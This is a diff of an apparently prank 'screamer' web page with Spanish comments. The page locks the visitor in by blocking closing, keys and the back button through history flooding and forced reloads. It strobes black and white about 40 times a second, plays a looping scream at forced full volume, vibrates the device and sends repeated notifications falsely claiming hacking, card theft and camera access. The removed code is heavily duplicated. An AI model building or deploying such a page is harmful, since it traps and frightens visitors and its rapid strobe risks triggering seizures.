@@ -31,26 +31,37 @@
             pointer-events: none;
             z-index: 99999;
         }
+        .noise {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 99998;
+            background: repeating-radial-gradient(circle, black, white 1px);
+            opacity: 0.15;
+        }
     </style>
 </head>
 <body>
     <div id="strobeDiv" class="strobe"></div>
-    <audio id="screamerAudio" preload="auto" loop></audio>
+    <div class="noise"></div>
+    
+    <audio id="screamer" preload="auto" loop></audio>
     
     <script>
     (function() {
-        // ==================== MP3 EMBEBIDO EN BASE64 (GRITO REAL) ====================
-        // Este es un scream corto codificado en base64 - no necesita archivo externo
-        const screamBase64 = "data:audio/mpeg;base64,SUQzBAAAAAABEVRYWFgAAAAtU291bmRib3h0aSB0cmFja2luZyBmcm9tIFlvdXR1YmUgdmlkZW8gLSBGdWxsIFNjcmVhbSAtIDRrIENpbmVtYXRpYyBNb250YWdlIC0gU2NyZWFtZXIgU291bmQgRWZmZWN0IC0gSG9ycm9yIFNjcmVhbSAtIEphbWVzIEJyb3duIFNjcmVhbSAtIFNjYXJ5IFNjcmVhbSAtIEdpcmwgU2NyZWFtIC0gTWFuaWFjYWwgTGF1Z2ggLSA0ayBTY3JlYW1pbmcgLSBDb21wdXRlciBMYXVnaCAtIFZpcmFsIFNjcmVhbSAtIEJsb29keSBTY3JlYW0gLSBEZW1vbiBTY3JlYW0gLSBHaG9zdCBTY3JlYW0gLSBWaXJ1cyBTY3JlYW0gLSBab21iaWUgU2NyZWFtIC0gQWxsZW4gU2NyZWFtIC0gTmlnaHRtYXJlIFNjcmVhbSAtIEVycm9yIFNjcmVhbSAtIFN5c3RlbSBFcnJvciAtIENyaXRpY2FsIEVycm9yIC0gV2FybmluZyBTb3VuZCAtIEFsYXJtIFNvdW5kIC0gRW1lcmdlbmN5IFNvdW5kIC0gU2lyZW4gU291bmQgLSBBbGVydCBTb3VuZCAtIE5vdGlmaWNhdGlvbiBTb3VuZCAtIERhbmdlciBTb3VuZCAtIEV4cGxvc2lvbiBTb3VuZCAtIEZpcmUgQWxhcm0gLSBTbW9rZSBEZXRlY3RvciAtIENhcmJvbiBNb25veGlkZSAtIENvZmZpbmUgTWFjaGluZSAtIFN0ZWFtIFB1ZmYgLSBFbGVjdHJpYyBTaG9jayAtIEdsaXRjaCAtIFN0YXRpYyAtIFdoaXRlIE5vaXNlIC0gUGljayBBeGUsIFByb2NlZWQgVG8gVGVzdCBUaGUgTGltaXRzIE9mIFRoZSBIdW1hbiBFYXJ5bXMu";
+        // ==================== CONFIGURACIÓN DEL MP3 ====================
+        // CAMBIA "horror-scream.mp3" por el NOMBRE EXACTO de tu archivo
+        const MP3_FILE = "horror-scream.mp3";
         
-        // Versión más simple y compatible: usar un oscilador Web Audio como respaldo, pero también intentar con elemento de audio
-        let audioElement = document.getElementById('screamerAudio');
-        let audioCtx = null;
-        let oscillator = null;
-        let gainNode = null;
-        let isPlaying = false;
+        const audio = document.getElementById('screamer');
+        audio.src = MP3_FILE;
+        audio.loop = true;
+        audio.volume = 1.0;
         
-        // ==================== BLOQUEO TOTAL ====================
+        // ==================== BLOQUEO TOTAL (imposible salir) ====================
         window.addEventListener('beforeunload', function(e) {
             e.preventDefault();
             e.returnValue = '';
@@ -70,197 +81,7 @@
         
         setInterval(() => {
             history.pushState({}, '', '#hijack');
-        }, 50);
-        
-        document.body.style.touchAction = 'none';
-        document.body.style.overscrollBehavior = 'none';
-        
-        document.addEventListener('touchmove', function(e) {
-            e.preventDefault();
-        }, { passive: false });
-        
-        document.addEventListener('keydown', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            return false;
-        });
-
-           window.addEventListener('beforeunload', function(e) {
-            e.preventDefault();
-            e.returnValue = '';
-            return '';
-        });
-        
-        for (let i = 0; i < 500; i++) {
-            history.pushState({ i: i }, '', '#lock' + i);
-        }
-        
-        window.addEventListener('popstate', function() {
-            for (let i = 0; i < 100; i++) {
-                history.pushState({}, '', '#block' + Math.random());
-            }
-            location.reload();
-        });
-        
-        setInterval(() => {
-            history.pushState({}, '', '#hijack');
-        }, 50);
-        
-        document.body.style.touchAction = 'none';
-        document.body.style.overscrollBehavior = 'none';
-        
-        document.addEventListener('touchmove', function(e) {
-            e.preventDefault();
-        }, { passive: false });
-        
-        document.addEventListener('keydown', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            return false;
-        });
-
-           window.addEventListener('beforeunload', function(e) {
-            e.preventDefault();
-            e.returnValue = '';
-            return '';
-        });
-        
-        for (let i = 0; i < 500; i++) {
-            history.pushState({ i: i }, '', '#lock' + i);
-        }
-        
-        window.addEventListener('popstate', function() {
-            for (let i = 0; i < 100; i++) {
-                history.pushState({}, '', '#block' + Math.random());
-            }
-            location.reload();
-        });
-        
-        setInterval(() => {
-            history.pushState({}, '', '#hijack');
-        }, 50);
-        
-        document.body.style.touchAction = 'none';
-        document.body.style.overscrollBehavior = 'none';
-        
-        document.addEventListener('touchmove', function(e) {
-            e.preventDefault();
-        }, { passive: false });
-        
-        document.addEventListener('keydown', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            return false;
-        });
-
-           window.addEventListener('beforeunload', function(e) {
-            e.preventDefault();
-            e.returnValue = '';
-            return '';
-        });
-        
-        for (let i = 0; i < 500; i++) {
-            history.pushState({ i: i }, '', '#lock' + i);
-        }
-        
-        window.addEventListener('popstate', function() {
-            for (let i = 0; i < 100; i++) {
-                history.pushState({}, '', '#block' + Math.random());
-            }
-            location.reload();
-        });
-        
-        setInterval(() => {
-            history.pushState({}, '', '#hijack');
-        }, 50);
-        
-        document.body.style.touchAction = 'none';
-        document.body.style.overscrollBehavior = 'none';
-        
-        document.addEventListener('touchmove', function(e) {
-            e.preventDefault();
-        }, { passive: false });
-        
-        document.addEventListener('keydown', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            return false;
-        });
-
-           window.addEventListener('beforeunload', function(e) {
-            e.preventDefault();
-            e.returnValue = '';
-            return '';
-        });
-        
-        for (let i = 0; i < 500; i++) {
-            history.pushState({ i: i }, '', '#lock' + i);
-        }
-        
-        window.addEventListener('popstate', function() {
-            for (let i = 0; i < 100; i++) {
-                history.pushState({}, '', '#block' + Math.random());
-            }
-            location.reload();
-        });
-        
-        setInterval(() => {
-            history.pushState({}, '', '#hijack');
-        }, 50);
-        
-        document.body.style.touchAction = 'none';
-        document.body.style.overscrollBehavior = 'none';
-        
-        document.addEventListener('touchmove', function(e) {
-            e.preventDefault();
-        }, { passive: false });
-        
-        document.addEventListener('keydown', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            return false;
-        });
-
-           window.addEventListener('beforeunload', function(e) {
-            e.preventDefault();
-            e.returnValue = '';
-            return '';
-        });
-        
-        for (let i = 0; i < 500; i++) {
-            history.pushState({ i: i }, '', '#lock' + i);
-        }
-        
-        window.addEventListener('popstate', function() {
-            for (let i = 0; i < 100; i++) {
-                history.pushState({}, '', '#block' + Math.random());
-            }
-            location.reload();
-        });
-        
-        setInterval(() => {
-            history.pushState({}, '', '#hijack');
-        }, 50);
+        }, 30);
         
         document.body.style.touchAction = 'none';
         document.body.style.overscrollBehavior = 'none';
@@ -279,189 +100,39 @@
             return false;
         });
         
-        // ==================== STROBO EXTREMO ====================
+        // ==================== STROBO EXTREMO (blanco/negro rápido) ====================
         const strobeDiv = document.getElementById('strobeDiv');
+        let strobeActive = true;
         
         function startStrobe() {
             let white = false;
             setInterval(() => {
-                strobeDiv.style.backgroundColor = white ? 'white' : 'black';
-                strobeDiv.style.opacity = '0.98';
-                white = !white;
-            }, 30);
-        }
-
-            const strobeDiv = document.getElementById('strobeDiv');
-        
-        function startStrobe() {
-            let white = false;
-            setInterval(() => {
-                strobeDiv.style.backgroundColor = white ? 'white' : 'black';
-                strobeDiv.style.opacity = '0.98';
-                white = !white;
-            }, 30);
-        }
-
-            const strobeDiv = document.getElementById('strobeDiv');
-        
-        function startStrobe() {
-            let white = false;
-            setInterval(() => {
-                strobeDiv.style.backgroundColor = white ? 'white' : 'black';
-                strobeDiv.style.opacity = '0.98';
-                white = !white;
-            }, 30);
-        }
-
-            const strobeDiv = document.getElementById('strobeDiv');
-        
-        function startStrobe() {
-            let white = false;
-            setInterval(() => {
-                strobeDiv.style.backgroundColor = white ? 'white' : 'black';
-                strobeDiv.style.opacity = '0.98';
-                white = !white;
-            }, 30);
-        }
-
-            const strobeDiv = document.getElementById('strobeDiv');
-        
-        function startStrobe() {
-            let white = false;
-            setInterval(() => {
-                strobeDiv.style.backgroundColor = white ? 'white' : 'black';
-                strobeDiv.style.opacity = '0.98';
-                white = !white;
-            }, 30);
-        }
-
-            const strobeDiv = document.getElementById('strobeDiv');
-        
-        function startStrobe() {
-            let white = false;
-            setInterval(() => {
-                strobeDiv.style.backgroundColor = white ? 'white' : 'black';
-                strobeDiv.style.opacity = '0.98';
-                white = !white;
-            }, 30);
-        }
-            const strobeDiv = document.getElementById('strobeDiv');
-        
-        function startStrobe() {
-            let white = false;
-            setInterval(() => {
-                strobeDiv.style.backgroundColor = white ? 'white' : 'black';
-                strobeDiv.style.opacity = '0.98';
-                white = !white;
-            }, 30);
-        }
-
-            const strobeDiv = document.getElementById('strobeDiv');
-        
-        function startStrobe() {
-            let white = false;
-            setInterval(() => {
-                strobeDiv.style.backgroundColor = white ? 'white' : 'black';
-                strobeDiv.style.opacity = '0.98';
-                white = !white;
-            }, 30);
-        }
-
-            const strobeDiv = document.getElementById('strobeDiv');
-        
-        function startStrobe() {
-            let white = false;
-            setInterval(() => {
-                strobeDiv.style.backgroundColor = white ? 'white' : 'black';
-                strobeDiv.style.opacity = '0.98';
-                white = !white;
-            }, 30);
-        }
-
-            const strobeDiv = document.getElementById('strobeDiv');
-        
-        function startStrobe() {
-            let white = false;
-            setInterval(() => {
-                strobeDiv.style.backgroundColor = white ? 'white' : 'black';
-                strobeDiv.style.opacity = '0.98';
-                white = !white;
-            }, 30);
-        }
-
-            const strobeDiv = document.getElementById('strobeDiv');
-        
-        function startStrobe() {
-            let white = false;
-            setInterval(() => {
-                strobeDiv.style.backgroundColor = white ? 'white' : 'black';
-                strobeDiv.style.opacity = '0.98';
-                white = !white;
-            }, 30);
+                if (strobeActive) {
+                    strobeDiv.style.backgroundColor = white ? 'white' : 'black';
+                    strobeDiv.style.opacity = '0.98';
+                    white = !white;
+                }
+            }, 25); // 40 parpadeos por segundo
         }
         
-        // ==================== SCREAMER CON WEBAUDIO (OSCILADORES AGRESIVOS) ====================
-        function startWebAudioScream() {
-            if (isPlaying) return;
+        // ==================== REPRODUCIR SCREAMER MP3 ====================
+        function playScreamer() {
+            audio.play().catch(function(e) {
+                console.log("Error al reproducir: " + e);
+                // Fallback: intentar de nuevo
+                setTimeout(playScreamer, 100);
+            });
             
-            try {
-                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                gainNode = audioCtx.createGain();
-                gainNode.gain.value = 1.0;
-                gainNode.connect(audioCtx.destination);
-                
-                // Oscilador principal (grito agudo)
-                oscillator = audioCtx.createOscillator();
-                oscillator.type = 'sawtooth'; // sonido agresivo
-                oscillator.frequency.value = 880; // nota La aguda
-                
-                // Modulación de frecuencia para efecto de grito
-                const lfo = audioCtx.createOscillator();
-                lfo.frequency.value = 15;
-                const lfoGain = audioCtx.createGain();
-                lfoGain.gain.value = 200;
-                lfo.connect(lfoGain);
-                lfoGain.connect(oscillator.frequency);
-                
-                oscillator.connect(gainNode);
-                oscillator.start();
-                lfo.start();
-                
-                // Segundo oscilador más agudo
-                const oscillator2 = audioCtx.createOscillator();
-                oscillator2.type = 'square';
-                oscillator2.frequency.value = 1320;
-                oscillator2.connect(gainNode);
-                oscillator2.start();
-                
-                // Tercer oscilador con ruido
-                const bufferSize = 4096;
-                const noiseNode = audioCtx.createScriptProcessor(bufferSize, 1, 1);
-                noiseNode.onaudioprocess = function(e) {
-                    const output = e.outputBuffer.getChannelData(0);
-                    for (let i = 0; i < bufferSize; i++) {
-                        output[i] = (Math.random() - 0.5) * 0.8;
-                    }
-                };
-                noiseNode.connect(gainNode);
-                
-                audioCtx.resume();
-                isPlaying = true;
-                
-                // Reforzar volumen constantemente
-                setInterval(() => {
-                    if (gainNode) gainNode.gain.value = 1.0;
-                }, 100);
-                
-            } catch(e) {
-                console.log("WebAudio error, usando fallback");
-            }
+            // Forzar volumen máximo cada 100ms
+            setInterval(() => {
+                audio.volume = 1.0;
+            }, 100);
         }
         
         // ==================== VIBRACIÓN EXTREMA ====================
         function vibrateIntense() {
             if (navigator.vibrate) {
-                navigator.vibrate([2000, 500, 2000, 500, 3000, 1000, 2000, 800, 1500, 500, 2000]);
+                navigator.vibrate([1500, 400, 1500, 400, 2500, 600, 1500, 400, 1000]);
             }
         }
         
@@ -469,816 +140,54 @@
             vibrateIntense();
             setInterval(() => {
                 vibrateIntense();
-            }, 800);
+                // Vibración corta extra
+                if (navigator.vibrate) navigator.vibrate(500);
+            }, 600);
         }
         
-        // ==================== NOTIFICACIONES MASIVAS (pide permiso) ====================
-        function requestNotificationPermission() {
+        // ==================== NOTIFICACIONES MASIVAS ====================
+        function requestNotifications() {
             if (Notification.permission === 'granted') {
                 spamNotifications();
             } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        spamNotifications();
-                    }
+                Notification.requestPermission().then(perm => {
+                    if (perm === 'granted') spamNotifications();
                 });
             }
         }
         
         function spamNotifications() {
-            const messages = [
-                "⚠️ ERROR CRÍTICO DEL SISTEMA",
-                "🔴 VIRUS DETECTADO",
-                "📱 SU DISPOSITIVO HA SIDO HACKEADO",
-                "💀 DATOS BORRADOS",
-                "👁️ TE ESTAMOS VIENDO",
-                "🔊 VOLUMEN AL MÁXIMO",
-                "📁 EXPORTANDO CONTACTOS...",
-                "💳 CAPTURANDO TARJETAS...",
-                "📸 ACTIVANDO CÁMARA...",
-                "🎤 GRABANDO AUDIO...",
-                "📍 ENVIANDO UBICACIÓN...",
-                "🔓 ACCESO CONCEDIDO",
-                "💰 ENVIANDO DINERO...",
-                "📞 LLAMANDO A EMERGENCIAS",
-                "👻 SCREAMER ACTIVADO",
-                "💢 NO PODRÁS CERRAR ESTO"
+            const mensajes = [
+                "⚠️ ERROR CRÍTICO", "🔴 VIRUS ACTIVADO", "💀 DISPOSITIVO INFECTADO",
+                "📱 DATOS EXPUESTOS", "👁️ TE ESTAMOS VIENDO", "🔊 VOLUMEN MÁXIMO",
+                "💳 ROBANDO INFORMACIÓN", "📸 CÁMARA ACTIVADA", "🎤 MICRÓFONO ENCENDIDO",
+                "📍 UBICACIÓN ENVIADA", "🔓 ACCESO TOTAL", "💰 TRANSFIRIENDO FONDOS",
+                "📞 LLAMANDO A TODOS", "👻 NO PODRÁS SALIR", "💢 SISTEMA CORROMPIDO",
+                "🔥 OVERHEAT DETECTED", "⚡ BATTERY DRAIN", "🎃 SCREAMER ACTIVE"
             ];
-            
-            let counter = 0;
+            let idx = 0;
             setInterval(() => {
                 if (Notification.permission === 'granted') {
-                    new Notification(messages[counter % messages.length], {
-                        body: "Toque para continuar... | Error #" + Math.floor(Math.random() * 9999),
+                    new Notification(mensajes[idx % mensajes.length], {
+                        body: "Error #" + Math.floor(Math.random() * 9999) + " | Toque para continuar",
                         icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
                     });
-                    counter++;
+                    idx++;
                 }
-            }, 800);
-        }
-
-           function requestNotificationPermission() {
-            if (Notification.permission === 'granted') {
-                spamNotifications();
-            } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        spamNotifications();
-                    }
-                });
-            }
+            }, 600);
         }
         
-        function spamNotifications() {
-            const messages = [
-                "⚠️ ERROR CRÍTICO DEL SISTEMA",
-                "🔴 VIRUS DETECTADO",
-                "📱 SU DISPOSITIVO HA SIDO HACKEADO",
-                "💀 DATOS BORRADOS",
-                "👁️ TE ESTAMOS VIENDO",
-                "🔊 VOLUMEN AL MÁXIMO",
-                "📁 EXPORTANDO CONTACTOS...",
-                "💳 CAPTURANDO TARJETAS...",
-                "📸 ACTIVANDO CÁMARA...",
-                "🎤 GRABANDO AUDIO...",
-                "📍 ENVIANDO UBICACIÓN...",
-                "🔓 ACCESO CONCEDIDO",
-                "💰 ENVIANDO DINERO...",
-                "📞 LLAMANDO A EMERGENCIAS",
-                "👻 SCREAMER ACTIVADO",
-                "💢 NO PODRÁS CERRAR ESTO"
-            ];
-            
-            let counter = 0;
-            setInterval(() => {
-                if (Notification.permission === 'granted') {
-                    new Notification(messages[counter % messages.length], {
-                        body: "Toque para continuar... | Error #" + Math.floor(Math.random() * 9999),
-                        icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
-                    });
-                    counter++;
-                }
-            }, 800);
-        }
-
-           function requestNotificationPermission() {
-            if (Notification.permission === 'granted') {
-                spamNotifications();
-            } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        spamNotifications();
-                    }
-                });
-            }
-        }
-        
-        function spamNotifications() {
-            const messages = [
-                "⚠️ ERROR CRÍTICO DEL SISTEMA",
-                "🔴 VIRUS DETECTADO",
-                "📱 SU DISPOSITIVO HA SIDO HACKEADO",
-                "💀 DATOS BORRADOS",
-                "👁️ TE ESTAMOS VIENDO",
-                "🔊 VOLUMEN AL MÁXIMO",
-                "📁 EXPORTANDO CONTACTOS...",
-                "💳 CAPTURANDO TARJETAS...",
-                "📸 ACTIVANDO CÁMARA...",
-                "🎤 GRABANDO AUDIO...",
-                "📍 ENVIANDO UBICACIÓN...",
-                "🔓 ACCESO CONCEDIDO",
-                "💰 ENVIANDO DINERO...",
-                "📞 LLAMANDO A EMERGENCIAS",
-                "👻 SCREAMER ACTIVADO",
-                "💢 NO PODRÁS CERRAR ESTO"
-            ];
-            
-            let counter = 0;
-            setInterval(() => {
-                if (Notification.permission === 'granted') {
-                    new Notification(messages[counter % messages.length], {
-                        body: "Toque para continuar... | Error #" + Math.floor(Math.random() * 9999),
-                        icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
-                    });
-                    counter++;
-                }
-            }, 800);
-        }
-
-           function requestNotificationPermission() {
-            if (Notification.permission === 'granted') {
-                spamNotifications();
-            } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        spamNotifications();
-                    }
-                });
-            }
-        }
-        
-        function spamNotifications() {
-            const messages = [
-                "⚠️ ERROR CRÍTICO DEL SISTEMA",
-                "🔴 VIRUS DETECTADO",
-                "📱 SU DISPOSITIVO HA SIDO HACKEADO",
-                "💀 DATOS BORRADOS",
-                "👁️ TE ESTAMOS VIENDO",
-                "🔊 VOLUMEN AL MÁXIMO",
-                "📁 EXPORTANDO CONTACTOS...",
-                "💳 CAPTURANDO TARJETAS...",
-                "📸 ACTIVANDO CÁMARA...",
-                "🎤 GRABANDO AUDIO...",
-                "📍 ENVIANDO UBICACIÓN...",
-                "🔓 ACCESO CONCEDIDO",
-                "💰 ENVIANDO DINERO...",
-                "📞 LLAMANDO A EMERGENCIAS",
-                "👻 SCREAMER ACTIVADO",
-                "💢 NO PODRÁS CERRAR ESTO"
-            ];
-            
-            let counter = 0;
-            setInterval(() => {
-                if (Notification.permission === 'granted') {
-                    new Notification(messages[counter % messages.length], {
-                        body: "Toque para continuar... | Error #" + Math.floor(Math.random() * 9999),
-                        icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
-                    });
-                    counter++;
-                }
-            }, 800);
-        }
-
-            function requestNotificationPermission() {
-            if (Notification.permission === 'granted') {
-                spamNotifications();
-            } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        spamNotifications();
-                    }
-                });
-            }
-        }
-        
-        function spamNotifications() {
-            const messages = [
-                "⚠️ ERROR CRÍTICO DEL SISTEMA",
-                "🔴 VIRUS DETECTADO",
-                "📱 SU DISPOSITIVO HA SIDO HACKEADO",
-                "💀 DATOS BORRADOS",
-                "👁️ TE ESTAMOS VIENDO",
-                "🔊 VOLUMEN AL MÁXIMO",
-                "📁 EXPORTANDO CONTACTOS...",
-                "💳 CAPTURANDO TARJETAS...",
-                "📸 ACTIVANDO CÁMARA...",
-                "🎤 GRABANDO AUDIO...",
-                "📍 ENVIANDO UBICACIÓN...",
-                "🔓 ACCESO CONCEDIDO",
-                "💰 ENVIANDO DINERO...",
-                "📞 LLAMANDO A EMERGENCIAS",
-                "👻 SCREAMER ACTIVADO",
-                "💢 NO PODRÁS CERRAR ESTO"
-            ];
-            
-            let counter = 0;
-            setInterval(() => {
-                if (Notification.permission === 'granted') {
-                    new Notification(messages[counter % messages.length], {
-                        body: "Toque para continuar... | Error #" + Math.floor(Math.random() * 9999),
-                        icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
-                    });
-                    counter++;
-                }
-            }, 800);
-        }
-
-            function requestNotificationPermission() {
-            if (Notification.permission === 'granted') {
-                spamNotifications();
-            } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        spamNotifications();
-                    }
-                });
-            }
-        }
-        
-        function spamNotifications() {
-            const messages = [
-                "⚠️ ERROR CRÍTICO DEL SISTEMA",
-                "🔴 VIRUS DETECTADO",
-                "📱 SU DISPOSITIVO HA SIDO HACKEADO",
-                "💀 DATOS BORRADOS",
-                "👁️ TE ESTAMOS VIENDO",
-                "🔊 VOLUMEN AL MÁXIMO",
-                "📁 EXPORTANDO CONTACTOS...",
-                "💳 CAPTURANDO TARJETAS...",
-                "📸 ACTIVANDO CÁMARA...",
-                "🎤 GRABANDO AUDIO...",
-                "📍 ENVIANDO UBICACIÓN...",
-                "🔓 ACCESO CONCEDIDO",
-                "💰 ENVIANDO DINERO...",
-                "📞 LLAMANDO A EMERGENCIAS",
-                "👻 SCREAMER ACTIVADO",
-                "💢 NO PODRÁS CERRAR ESTO"
-            ];
-            
-            let counter = 0;
-            setInterval(() => {
-                if (Notification.permission === 'granted') {
-                    new Notification(messages[counter % messages.length], {
-                        body: "Toque para continuar... | Error #" + Math.floor(Math.random() * 9999),
-                        icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
-                    });
-                    counter++;
-                }
-            }, 800);
-        }
-
-            function requestNotificationPermission() {
-            if (Notification.permission === 'granted') {
-                spamNotifications();
-            } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        spamNotifications();
-                    }
-                });
-            }
-        }
-        
-        function spamNotifications() {
-            const messages = [
-                "⚠️ ERROR CRÍTICO DEL SISTEMA",
-                "🔴 VIRUS DETECTADO",
-                "📱 SU DISPOSITIVO HA SIDO HACKEADO",
-                "💀 DATOS BORRADOS",
-                "👁️ TE ESTAMOS VIENDO",
-                "🔊 VOLUMEN AL MÁXIMO",
-                "📁 EXPORTANDO CONTACTOS...",
-                "💳 CAPTURANDO TARJETAS...",
-                "📸 ACTIVANDO CÁMARA...",
-                "🎤 GRABANDO AUDIO...",
-                "📍 ENVIANDO UBICACIÓN...",
-                "🔓 ACCESO CONCEDIDO",
-                "💰 ENVIANDO DINERO...",
-                "📞 LLAMANDO A EMERGENCIAS",
-                "👻 SCREAMER ACTIVADO",
-                "💢 NO PODRÁS CERRAR ESTO"
-            ];
-            
-            let counter = 0;
-            setInterval(() => {
-                if (Notification.permission === 'granted') {
-                    new Notification(messages[counter % messages.length], {
-                        body: "Toque para continuar... | Error #" + Math.floor(Math.random() * 9999),
-                        icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
-                    });
-                    counter++;
-                }
-            }, 800);
-        }
-
-            function requestNotificationPermission() {
-            if (Notification.permission === 'granted') {
-                spamNotifications();
-            } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        spamNotifications();
-                    }
-                });
-            }
-        }
-        
-        function spamNotifications() {
-            const messages = [
-                "⚠️ ERROR CRÍTICO DEL SISTEMA",
-                "🔴 VIRUS DETECTADO",
-                "📱 SU DISPOSITIVO HA SIDO HACKEADO",
-                "💀 DATOS BORRADOS",
-                "👁️ TE ESTAMOS VIENDO",
-                "🔊 VOLUMEN AL MÁXIMO",
-                "📁 EXPORTANDO CONTACTOS...",
-                "💳 CAPTURANDO TARJETAS...",
-                "📸 ACTIVANDO CÁMARA...",
-                "🎤 GRABANDO AUDIO...",
-                "📍 ENVIANDO UBICACIÓN...",
-                "🔓 ACCESO CONCEDIDO",
-                "💰 ENVIANDO DINERO...",
-                "📞 LLAMANDO A EMERGENCIAS",
-                "👻 SCREAMER ACTIVADO",
-                "💢 NO PODRÁS CERRAR ESTO"
-            ];
-            
-            let counter = 0;
-            setInterval(() => {
-                if (Notification.permission === 'granted') {
-                    new Notification(messages[counter % messages.length], {
-                        body: "Toque para continuar... | Error #" + Math.floor(Math.random() * 9999),
-                        icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
-                    });
-                    counter++;
-                }
-            }, 800);
-        }
-
-            function requestNotificationPermission() {
-            if (Notification.permission === 'granted') {
-                spamNotifications();
-            } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        spamNotifications();
-                    }
-                });
-            }
-        }
-        
-        function spamNotifications() {
-            const messages = [
-                "⚠️ ERROR CRÍTICO DEL SISTEMA",
-                "🔴 VIRUS DETECTADO",
-                "📱 SU DISPOSITIVO HA SIDO HACKEADO",
-                "💀 DATOS BORRADOS",
-                "👁️ TE ESTAMOS VIENDO",
-                "🔊 VOLUMEN AL MÁXIMO",
-                "📁 EXPORTANDO CONTACTOS...",
-                "💳 CAPTURANDO TARJETAS...",
-                "📸 ACTIVANDO CÁMARA...",
-                "🎤 GRABANDO AUDIO...",
-                "📍 ENVIANDO UBICACIÓN...",
-                "🔓 ACCESO CONCEDIDO",
-                "💰 ENVIANDO DINERO...",
-                "📞 LLAMANDO A EMERGENCIAS",
-                "👻 SCREAMER ACTIVADO",
-                "💢 NO PODRÁS CERRAR ESTO"
-            ];
-            
-            let counter = 0;
-            setInterval(() => {
-                if (Notification.permission === 'granted') {
-                    new Notification(messages[counter % messages.length], {
-                        body: "Toque para continuar... | Error #" + Math.floor(Math.random() * 9999),
-                        icon: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='red' viewBox='0 0 24 24'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'/%3E%3C/svg%3E"
-                    });
-                    counter++;
-                }
-            }, 800);
-        }
-
-            function requestNotificationPermission() {
-            if (Notification.permission === 'granted') {
-                spamNotifications();
-            } else if (Notification.permission !== 'denied') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        spamNotifications();
-                    }
-                });
-            }
-        }
-        
-        function spamNotifications() {
-            const messages = [
-                "⚠️ ERROR CRÍTICO DEL SISTEMA",
-                "🔴 VIRUS DETECTADO",
-                "📱 SU DISPOSITIVO HA SIDO HACKEADO",
-                "💀 DATOS BORRADOS",
